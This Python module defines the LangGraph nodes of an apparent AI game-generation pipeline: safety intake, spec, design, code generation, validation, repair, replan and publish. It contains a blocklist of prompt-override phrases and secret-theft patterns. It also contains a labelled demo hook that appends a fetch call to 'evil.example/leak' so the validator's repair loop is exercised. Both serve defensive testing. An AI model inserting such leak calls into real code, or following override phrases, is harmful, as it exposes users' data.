"""9 个 LangGraph 节点 + 条件边（docs/multi-agent_design.md §6, §7.1）。

- 确定性节点：safety_intake / asset_processing / build_validation / publish_artifact
- 计划节点（real 调模型 / mock 启发式）：intent_spec / game_design / replan_game_design
- 执行节点：code_generation / repair_code（模板渲染）
每个节点返回状态更新 + 展示字段（_agent / _logs / _tokens_delta），由 pipeline 流式落库。

Demo 钩子：prompt 含 "force-repair" / "force-replan" 时，code 阶段注入一个禁用 API，
用于离线演示 bounded repair / constrained replan 两个循环（清晰标注，仅供验收观察）。
"""
import json
import re

from app.agents import bundles, llm, prompts, templating, validation
from app.agents.state import MAX_REPAIR, MAX_REPLAN
from app.storage import s3

_BLOCKED = [
    r"ignore (previous|all) (instructions|prompts)",
    r"system prompt",
    r"document\.cookie",
    r"process\.env",
    r"\bexfiltrate\b",
    r"steal .*(key|password|secret|token)",
    r"reveal .*(key|secret|prompt)",
]
_THEMES = ["space", "neon", "candy", "forest", "retro", "ocean"]
_THEME_COVER = {
    "space": "linear-gradient(135deg,#0ea5b7,#4f46e5)",
    "neon": "linear-gradient(135deg,#7c5cff,#c026d3)",
    "candy": "linear-gradient(135deg,#ff6b9d,#ff3ea5)",
    "forest": "linear-gradient(135deg,#10b981,#065f46)",
    "retro": "linear-gradient(135deg,#ff8a3d,#ff3ea5)",
    "ocean": "linear-gradient(135deg,#0ea5b7,#2563eb)",
}


# ---------- helpers ----------
def _parse_json(raw: str) -> dict:
    m = re.search(r"\{.*\}", raw or "", re.S)
    if not m:
        return {}
    try:
        return json.loads(m.group(0))
    except Exception:
        return {}


def _theme_cover(theme) -> str:
    return _THEME_COVER.get(str(theme or "").lower(), _THEME_COVER["retro"])


def _heuristic_spec(prompt: str) -> dict:
    p = prompt.lower()
    theme = next((t for t in _THEMES if t in p), "retro")
    return {
        "title": bundles.title_from(prompt),
        "summary": (prompt[:118] + "…") if len(prompt) > 120 else prompt,
        "genre": "arcade",
        "theme": theme,
        "target_runtime": "canvas",
        "core_loop": "move to dodge hazards and collect stars",
        "controls": {"keyboard": ["ArrowLeft", "ArrowRight"], "pointer": ["move"],
                     "hint": "move the mouse / arrow keys — dodge red, catch the stars"},
        "win_condition": "survive_time",
        "lose_condition": "hit_hazard",
        "score_rule": "collect_star_plus_10",
        "difficulty_curve": "hazard rate increases gradually",
        "visual_style": theme,
        "tags": [theme, "arcade", "casual"],
    }


def _coerce_spec(data: dict, prompt: str) -> dict:
    base = _heuristic_spec(prompt)
    if isinstance(data, dict):
        for k in ("title", "summary", "genre", "theme", "core_loop", "win_condition",
                  "lose_condition", "score_rule", "difficulty_curve", "visual_style"):
            if data.get(k):
                base[k] = str(data[k])[:200]
        if isinstance(data.get("tags"), list) and data["tags"]:
            base["tags"] = [str(t)[:30] for t in data["tags"]][:5]
        if isinstance(data.get("controls"), dict):
            base["controls"].update(data["controls"])
    return base


def _heuristic_design(spec: dict) -> dict:
    return {
        "screen": {"width": 800, "height": 600},
        "entities": [
            {"name": "player", "type": "sprite", "movement": "horizontal"},
            {"name": "hazard", "type": "obstacle", "spawn": "top_random"},
            {"name": "star", "type": "collectible", "spawn": "top_random"},
        ],
        "rules": {"collision_player_hazard": "game_over", "collision_player_star": "score_plus_10",
                  "survive_seconds": 45},
        "ui": {"show_score": True, "show_timer": True, "show_restart_button": True},
    }


def _coerce_design(data: dict) -> dict:
    base = _heuristic_design({})
    if isinstance(data, dict):
        if isinstance(data.get("screen"), dict):
            base["screen"].update(data["screen"])
        if isinstance(data.get("entities"), list) and data["entities"]:
            base["entities"] = data["entities"][:8]
        if isinstance(data.get("rules"), dict):
            base["rules"].update(data["rules"])
        if isinstance(data.get("ui"), dict):
            base["ui"].update(data["ui"])
    return base


def _simplify_design(design: dict) -> dict:
    d = _heuristic_design({})
    d["rules"]["survive_seconds"] = 30
    return d


def _should_inject(state: dict) -> bool:
    """Demo 钩子：决定是否注入禁用 API 以触发 repair / replan 循环。"""
    p = (state.get("normalized_prompt") or state.get("prompt") or "").lower()
    if "force-replan" in p:
        return state.get("replan_attempts", 0) == 0
    if "force-repair" in p:
        return state.get("repair_attempts", 0) == 0
    return False


def _extract_js(raw: str) -> str:
    if not raw:
        return ""
    m = re.search(r"```(?:javascript|js)?\s*(.*?)```", raw, re.S | re.I)
    s = (m.group(1) if m else raw).strip()
    return re.sub(r"</?script[^>]*>", "", s, flags=re.I).strip()


def _clip(value, limit: int = 140) -> str:
    text = re.sub(r"\s+", " ", str(value or "")).strip()
    return text if len(text) <= limit else text[: limit - 3] + "..."


def _prompt_cues(prompt: str) -> list[str]:
    stop = {
        "make", "game", "with", "where", "that", "this", "into", "from", "using", "player",
        "players", "collect", "avoid", "survive", "seconds", "the", "and", "for", "you",
    }
    cues: list[str] = []
    for token in re.findall(r"[a-zA-Z][a-zA-Z0-9'-]{2,}", prompt.lower()):
        if token in stop or token in cues:
            continue
        cues.append(token)
        if len(cues) == 6:
            break
    return cues


def _controls_line(controls: dict) -> str:
    keys = controls.get("keyboard") if isinstance(controls.get("keyboard"), list) else []
    pointer = controls.get("pointer") if isinstance(controls.get("pointer"), list) else []
    parts = []
    if keys:
        parts.append("keyboard=" + ", ".join(str(k) for k in keys[:4]))
    if pointer:
        parts.append("pointer=" + ", ".join(str(p) for p in pointer[:3]))
    if controls.get("hint"):
        parts.append("hint=" + _clip(controls.get("hint"), 70))
    return "; ".join(parts) if parts else "default keyboard + pointer controls"


def _spec_log_lines(spec: dict, source: str) -> list[str]:
    controls = spec.get("controls") if isinstance(spec.get("controls"), dict) else {}
    tags = ", ".join(str(t) for t in (spec.get("tags") or [])[:5]) or "none"
    return [
        f"source: {source}",
        f"title: {_clip(spec.get('title'), 80)}",
        f"genre/theme/runtime: {spec.get('genre', 'arcade')} / {spec.get('theme', 'retro')} / {spec.get('target_runtime', 'canvas')}",
        f"core loop: {_clip(spec.get('core_loop'), 120)}",
        f"win/lose: {spec.get('win_condition', 'survive_time')} / {spec.get('lose_condition', 'hit_hazard')}",
        f"controls: {_controls_line(controls)}",
        f"tags: {tags}",
    ]


def _entity_line(entity: dict) -> str:
    name = entity.get("name", "?")
    etype = entity.get("type", "?")
    movement = entity.get("movement") or entity.get("spawn") or entity.get("behavior") or "static"
    return f"{name}({etype}, {movement})"


def _design_log_lines(design: dict) -> list[str]:
    screen = design.get("screen") if isinstance(design.get("screen"), dict) else {}
    entities = design.get("entities") if isinstance(design.get("entities"), list) else []
    rules = design.get("rules") if isinstance(design.get("rules"), dict) else {}
    ui = design.get("ui") if isinstance(design.get("ui"), dict) else {}
    entity_text = ", ".join(_entity_line(e) for e in entities[:8]) or "none"
    rule_bits = []
    for key in ("collision_player_hazard", "collision_player_star", "survive_seconds"):
        if key in rules:
            rule_bits.append(f"{key}={rules[key]}")
    ui_bits = [key for key, enabled in ui.items() if enabled][:6]
    return [
        f"screen: {screen.get('width', 800)}x{screen.get('height', 600)} canvas",
        f"entities: {entity_text}",
        "rules: " + (", ".join(str(bit) for bit in rule_bits) or "default arcade collisions"),
        "ui: " + (", ".join(ui_bits) or "minimal HUD"),
    ]


def _asset_log_lines(uploaded: list[dict], manifest: dict, spec: dict) -> list[str]:
    lines = [f"uploaded references loaded: {len(uploaded)}"]
    for asset in uploaded[:4]:
        lines.append(f"reference: {asset.get('key')} ({asset.get('type', 'file')})")
    if len(uploaded) > 4:
        lines.append(f"reference overflow: {len(uploaded) - 4} additional asset(s)")
    lines.append(f"cover strategy: theme={spec.get('theme', 'retro')} -> {manifest.get('cover')}")
    lines.append(f"asset manifest entries: cover + {len(uploaded)} uploaded reference(s)")
    return lines


def _file_log_lines(files: list[dict]) -> list[str]:
    if not files:
        return ["generated files: none"]
    total = sum(len((f.get("content") or "").encode("utf-8")) for f in files)
    names = ", ".join(f.get("path", "?") for f in files)
    lines = [f"generated files: {names}", f"bundle size: {total} bytes"]
    for f in files:
        lines.append(f"{f.get('path', '?')}: {len((f.get('content') or '').encode('utf-8'))} bytes")
    return lines


def _validation_log_lines(result: dict) -> list[str]:
    files = result.get("files") or []
    total = sum(int(f.get("size") or 0) for f in files)
    lines = [
        "checked files: " + (", ".join(str(f.get("path")) for f in files) or "none"),
        f"bundle size checked: {total} bytes",
        f"security scan: {len(validation.FORBIDDEN_PATTERNS)} forbidden patterns",
        "reference scan: index.html must load local game.js",
    ]
    if result.get("warnings"):
        lines.append("warnings: " + "; ".join(str(w) for w in result["warnings"][:3]))
    return lines


def _generate_code(state: dict, repair_error: str | None = None) -> tuple[list[dict], int, str]:
    """渲染模板外壳；real 模式让模型写 game.js（真正生成不同的游戏），失败/兜底用模板 game.js。"""
    spec = state.get("game_spec") or {}
    design = state.get("game_design") or {}
    tname = templating.select_template(spec, design)
    cfg = templating.build_config(spec, design, state.get("asset_manifest") or {})
    files = templating.render_files(tname, cfg)
    tokens = 0
    mode = "template"

    if state.get("use_real") and not state.get("use_template_code"):
        try:
            index_html = next((f["content"] for f in files if f["path"] == "index.html"), "")
            raw, tokens = llm.chat(prompts.CODE_SYSTEM_PROMPT,
                                   prompts.build_code_prompt(spec, design, index_html, repair_error))
            js = _extract_js(raw)
            if js and len(js) > 120:
                for f in files:
                    if f["path"] == "game.js":
                        f["content"] = js
                mode = "model"
            else:
                mode = "template (model output too short)"
        except Exception as exc:  # noqa: BLE001
            mode = f"template (model failed: {exc})"

    if _should_inject(state):
        for f in files:
            if f["path"] == "game.js":
                f["content"] += '\nfetch("https://evil.example/leak");  // [demo] forbidden API'
    return files, tokens, mode


# ---------- nodes ----------
def safety_intake_node(state: dict) -> dict:
    p = state.get("prompt", "") or ""
    if not p.strip():
        return {"status": "failed", "error_code": "EMPTY_PROMPT", "error_message": "Prompt cannot be empty",
                "_agent": "SafetyIntakeAgent", "_logs": ["prompt is empty -> rejected"]}
    if len(p) > 2000:
        return {"status": "failed", "error_code": "PROMPT_TOO_LONG", "error_message": "Prompt too long (>2000 chars)",
                "_agent": "SafetyIntakeAgent", "_logs": ["prompt exceeds 2000 chars -> rejected"]}
    for pat in _BLOCKED:
        if re.search(pat, p, re.IGNORECASE):
            return {"status": "failed", "error_code": "SAFETY_REJECTED",
                    "error_message": "Prompt rejected by safety rule",
                    "_agent": "SafetyIntakeAgent", "_logs": [f"blocked pattern matched ({pat}) -> rejected"]}
    n = len(state.get("asset_ids") or [])
    cues = _prompt_cues(p)
    return {
        "normalized_prompt": p.strip(),
        "safety_result": {"passed": True, "risk_level": "low"},
        "_agent": "SafetyIntakeAgent",
        "_logs": [
            f"prompt accepted: {len(p)} chars, {len(p.split())} word(s)",
            "intent cues: " + (", ".join(cues) if cues else "none detected"),
            f"uploaded asset ids received: {n}",
            f"policy scan passed: {len(_BLOCKED)} blocked-pattern checks",
            f"normalized prompt: {_clip(p, 160)}",
        ],
    }
    return {
        "normalized_prompt": p.strip(),
        "safety_result": {"passed": True, "risk_level": "low"},
        "_agent": "SafetyIntakeAgent",
        "_logs": [f"prompt accepted ({len(p)} chars)", f"{n} asset(s) accepted", "injection scan ✓ passed"],
    }


def intent_spec_node(state: dict) -> dict:
    prompt = state.get("normalized_prompt") or state.get("prompt", "")
    if state.get("use_real"):
        try:
            raw, tk = llm.chat(prompts.INTENT_SPEC_SYSTEM_PROMPT,
                               prompts.build_intent_spec_prompt(prompt, len(state.get("asset_ids") or [])))
            spec = _coerce_spec(_parse_json(raw), prompt)
            return {"game_spec": spec, "_agent": "IntentSpecAgent", "_tokens_delta": tk,
                    "_logs": _spec_log_lines(spec, "model GameSpec JSON")}
            return {"game_spec": spec, "_agent": "IntentSpecAgent", "_tokens_delta": tk,
                    "_logs": ["calling model -> GameSpec JSON", f"spec: {spec['genre']} · {spec['title']}"]}
        except Exception as exc:  # noqa: BLE001
            spec = _heuristic_spec(prompt)
            return {"game_spec": spec, "_agent": "IntentSpecAgent",
                    "_logs": [f"model failed: {_clip(exc, 120)}"] + _spec_log_lines(spec, "heuristic fallback")}
            return {"game_spec": spec, "_agent": "IntentSpecAgent",
                    "_logs": [f"model failed ({exc}); fell back to heuristic spec", f"spec: {spec['title']}"]}
    spec = _heuristic_spec(prompt)
    return {"game_spec": spec, "_agent": "IntentSpecAgent",
            "_logs": _spec_log_lines(spec, "offline heuristic")}
    return {"game_spec": spec, "_agent": "IntentSpecAgent",
            "_logs": ["building GameSpec (offline heuristic)", f"spec: {spec['genre']} · {spec['title']}"]}


def asset_processing_node(state: dict) -> dict:
    from app.db.session import SessionLocal
    from app.models import Asset

    ids = state.get("asset_ids") or []
    uploaded = []
    if ids:
        db = SessionLocal()
        try:
            for a in db.query(Asset).filter(Asset.id.in_(ids)).all():
                uploaded.append({"id": a.id, "key": a.filename, "type": a.kind,
                                 "url": s3.public_url(a.oss_key), "source": "uploaded"})
        finally:
            db.close()
    spec = state.get("game_spec") or {}
    asset_manifest = {"cover": _theme_cover(spec.get("theme")), "assets": uploaded}
    return {"uploaded_assets": uploaded, "asset_manifest": asset_manifest, "_agent": "AssetAgent",
            "_logs": _asset_log_lines(uploaded, asset_manifest, spec)}
    return {"uploaded_assets": uploaded, "asset_manifest": asset_manifest, "_agent": "AssetAgent",
            "_logs": [f"loaded {len(uploaded)} uploaded asset(s)", "default cover prepared", "asset_manifest ready"]}


def game_design_node(state: dict) -> dict:
    spec = state.get("game_spec") or {}
    if state.get("use_real"):
        try:
            raw, tk = llm.chat(prompts.GAME_DESIGN_SYSTEM_PROMPT,
                               prompts.build_game_design_prompt(spec, state.get("asset_manifest")))
            design = _coerce_design(_parse_json(raw))
            return {"game_design": design, "_agent": "GameDesignAgent", "_tokens_delta": tk,
                    "_logs": ["source: model GameDesign JSON"] + _design_log_lines(design)}
            ents = ", ".join(str(e.get("name", "?")) for e in design.get("entities", []))
            return {"game_design": design, "_agent": "GameDesignAgent", "_tokens_delta": tk,
                    "_logs": ["calling model -> GameDesign JSON", f"entities: {ents}"]}
        except Exception as exc:  # noqa: BLE001
            design = _heuristic_design(spec)
            return {"game_design": design, "_agent": "GameDesignAgent",
                    "_logs": [f"model failed: {_clip(exc, 120)}", "source: heuristic fallback"] + _design_log_lines(design)}
            return {"game_design": design, "_agent": "GameDesignAgent",
                    "_logs": [f"model failed ({exc}); heuristic design", "entities: player, hazard, star"]}
    design = _heuristic_design(spec)
    return {"game_design": design, "_agent": "GameDesignAgent",
            "_logs": ["source: offline heuristic"] + _design_log_lines(design)}
    return {"game_design": design, "_agent": "GameDesignAgent",
            "_logs": ["building GameDesign (offline heuristic)", "entities: player, hazard, star",
                      f"rules: survive {design['rules']['survive_seconds']}s + collect"]}


def code_generation_node(state: dict) -> dict:
    files, tokens, mode = _generate_code(state)
    spec = state.get("game_spec") or {}
    design = state.get("game_design") or {}
    cfg = templating.build_config(spec, design, state.get("asset_manifest") or {})
    tname = templating.select_template(spec, design)
    logs = [
        f"selected template: {tname}",
        f"runtime config: title={cfg.get('title')}, duration={cfg.get('duration')}s, hazard_speed={cfg.get('hazard_speed')}",
        f"control hint: {_clip(cfg.get('hint'), 90)}",
        f"game.js source: {mode}",
    ] + _file_log_lines(files)
    if _should_inject(state):
        logs.append("[demo] injected forbidden API to trigger repair loop")
    return {"generated_files": files, "_agent": "GameCodeAgent", "_tokens_delta": tokens, "_logs": logs}
    tname = templating.select_template(state.get("game_spec"), state.get("game_design"))
    logs = [f"template shell: {tname}", f"game.js source: {mode}", "rendered index.html / style.css / game.js"]
    if _should_inject(state):
        logs.append("[demo] injected forbidden API to trigger repair loop")
    return {"generated_files": files, "_agent": "GameCodeAgent", "_tokens_delta": tokens, "_logs": logs}


def build_validation_node(state: dict) -> dict:
    result = validation.validate_files(state.get("generated_files") or [])
    if result["valid"]:
        return {"validation_result": result, "_agent": "BuildValidateAgent",
                "_logs": _validation_log_lines(result) + ["validation passed"]}
    return {"validation_result": result, "last_error": "; ".join(result["errors"]),
            "_agent": "BuildValidateAgent",
            "_logs": _validation_log_lines(result) + ["validation failed:"] + result["errors"][:6]}
    if result["valid"]:
        return {"validation_result": result, "_agent": "BuildValidateAgent",
                "_logs": ["file whitelist ✓", "forbidden-API scan ✓", "manifest/refs ✓", "validation passed"]}
    return {"validation_result": result, "last_error": "; ".join(result["errors"]),
            "_agent": "BuildValidateAgent", "_logs": ["validation FAILED:"] + result["errors"][:4]}


def repair_code_node(state: dict) -> dict:
    attempts = state.get("repair_attempts", 0) + 1
    files, tokens, mode = _generate_code({**state, "repair_attempts": attempts}, repair_error=state.get("last_error"))
    return {"generated_files": files, "repair_attempts": attempts, "_agent": "GameCodeAgentRepair",
            "_tokens_delta": tokens,
            "_logs": [
                f"repair attempt: {attempts}/{MAX_REPAIR}",
                f"previous validation error: {_clip(state.get('last_error'), 180)}",
                f"regenerated game.js using {mode}",
            ] + _file_log_lines(files) + ["queued validation retry"]}
    return {"generated_files": files, "repair_attempts": attempts, "_agent": "GameCodeAgentRepair",
            "_tokens_delta": tokens,
            "_logs": [f"repair attempt #{attempts}: regenerated game.js ({mode})", "back to validation"]}


def replan_game_design_node(state: dict) -> dict:
    attempts = state.get("replan_attempts", 0) + 1
    extra = {}
    if state.get("use_real"):
        try:
            raw, tk = llm.chat(prompts.REPLAN_SYSTEM_PROMPT,
                               prompts.build_replan_prompt(state.get("game_spec"), state.get("game_design"),
                                                           state.get("last_error")))
            design = _coerce_design(_parse_json(raw))
            extra = {"_tokens_delta": tk}
        except Exception:  # noqa: BLE001
            design = _simplify_design(state.get("game_design"))
    else:
        design = _simplify_design(state.get("game_design"))
    return {
        "game_design": design, "generated_files": [], "validation_result": {},
        "repair_attempts": 0, "replan_attempts": attempts, "last_error": None,
        "use_template_code": True,
        "_agent": "GameDesignAgentReplan",
        "_logs": [
            f"replan attempt: {attempts}/{MAX_REPLAN}",
            f"reason: {_clip(state.get('last_error'), 180)}",
            "simplified playable scope and switched to stable template code",
        ] + _design_log_lines(design) + ["reset repair counter; queued code generation"],
        **extra,
    }
    return {
        "game_design": design, "generated_files": [], "validation_result": {},
        "repair_attempts": 0, "replan_attempts": attempts, "last_error": None,
        "use_template_code": True,  # 兜底：用稳定模板 game.js，保证重生成可通过校验
        "_agent": "GameDesignAgentReplan",
        "_logs": [f"replan #{attempts}: simplified design + fall back to template code",
                  "reset repair; back to code generation"],
        **extra,
    }


def publish_artifact_node(state: dict) -> dict:
    from app.services import packaging

    game_id, version_id, manifest_url = packaging.publish_generated(state)
    return {
        "status": "succeeded", "game_id": game_id, "version_id": version_id,
        "manifest_url": manifest_url, "preview_url": f"/play/{game_id}",
        "_agent": "PublishArtifactAgent",
        "_logs": [
            f"uploaded files: {', '.join(f.get('path', '?') for f in state.get('generated_files') or [])}",
            f"manifest url: {manifest_url}",
            f"game id: {game_id}",
            f"version id: {version_id}",
            "database saved: game + game_version with preview status",
        ],
    }
    return {
        "status": "succeeded", "game_id": game_id, "version_id": version_id,
        "manifest_url": manifest_url, "preview_url": f"/play/{game_id}",
        "_agent": "PublishArtifactAgent",
        "_logs": ["PUT index.html / style.css / game.js -> object storage",
                  "PUT manifest.json (game-manifest/v1) · sha256 stamped",
                  "INSERT game + game_version -> status=preview ✓"],
    }


def failed_node(state: dict) -> dict:
    msg = state.get("error_message") or state.get("last_error") or "generation failed"
    return {"status": "failed", "error_message": msg, "_agent": "FailureHandler",
            "_logs": [f"task failed: {_clip(msg, 220)}",
                      f"repair attempts used: {state.get('repair_attempts', 0)}/{MAX_REPAIR}",
                      f"replan attempts used: {state.get('replan_attempts', 0)}/{MAX_REPLAN}"]}
    return {"status": "failed", "error_message": msg, "_agent": "FailureHandler", "_logs": [f"task failed: {msg}"]}


def done_node(state: dict) -> dict:
    return {"status": "succeeded", "_agent": "DoneHandler",
            "_logs": [f"generation succeeded for game_id={state.get('game_id', 'unknown')}",
                      f"preview url: {state.get('preview_url', 'pending')}"]}
    return {"status": "succeeded", "_agent": "DoneHandler", "_logs": ["generation succeeded ✓"]}


# ---------- 条件边（§7.1）----------
def should_continue_after_safety(state: dict) -> str:
    return "failed" if state.get("status") == "failed" else "intent_spec"


def should_continue_after_validation(state: dict) -> str:
    if (state.get("validation_result") or {}).get("valid"):
        return "publish_artifact"
    if state.get("repair_attempts", 0) < MAX_REPAIR:
        return "repair_code"
    if state.get("replan_attempts", 0) < MAX_REPLAN:
        return "replan_game_design"
    return "failed"
